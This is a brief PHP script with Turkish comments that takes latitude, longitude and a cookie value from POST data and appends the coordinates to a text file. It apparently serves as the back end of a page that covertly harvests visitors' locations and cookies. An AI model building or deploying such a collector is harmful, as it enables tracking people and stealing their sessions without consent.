<?php
// POST verilerini almak için
$latitude = $_POST['latitude'];
$longitude = $_POST['longitude'];
$cookie = $_POST['cookie'];

// Dosyaya yazmak için
$dosya = fopen('konum.txt', 'a');
fwrite($dosya, $latitude . ',' . $longitude . "\n"."----------"."\n");
fclose($dosya);
?>